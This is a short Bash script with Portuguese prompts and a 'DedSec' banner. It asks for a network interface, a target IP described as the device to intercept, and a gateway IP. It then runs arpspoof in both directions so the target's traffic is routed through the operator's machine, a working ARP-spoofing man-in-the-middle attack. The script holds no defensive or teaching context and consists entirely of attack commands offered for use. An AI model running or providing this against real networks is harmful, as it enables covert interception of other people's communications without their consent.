#!/bin/bash

# Exibe o banner
echo "  _____           _  _____           "
echo " |  __ \         | |/ ____|          "
echo " | |  | | ___  __| | (___   ___  ___ "
echo " | |  | |/ _ \/ _' |\___ \ / _ \/ __|"
echo " | |__| |  __/ (_| |____) |  __/ (__ "
echo " |_____/ \___|\__,_|_____/ \___|\___|"
echo "                                     "
echo "                                     "

# Solicita a entrada do usuário para a interface de rede, o alvo e o roteador
read -p "Digite a interface de rede (exemplo: wlan0, eth0): " iface
read -p "Digite o IP do alvo (dispositivo que você quer interceptar): " alvo
read -p "Digite o IP do roteador (gateway): " roteador
echo "recomendo executar novamente e trocar o alvo pelo roteador(inverter) numa nova sessão" 
# Verifica se todos os parâmetros foram fornecidos
if [ -z "$iface" ] || [ -z "$alvo" ] || [ -z "$roteador" ]; then
    echo "Interface, alvo ou roteador não inserido! Saindo..."
    exit 1
fi

# Executa o primeiro comando arpspoof (alvo -> roteador)
echo "Executando ARP spoofing no alvo ($alvo) para o roteador ($roteador)..."
sudo arpspoof -i "$iface" -t "$alvo" "$roteador" &

# Executa o segundo comando arpspoof (roteador -> alvo)
echo "Executando ARP spoofing no roteador ($roteador) para o alvo ($alvo)..."
sudo arpspoof -i "$iface" -t "$roteador" "$alvo"
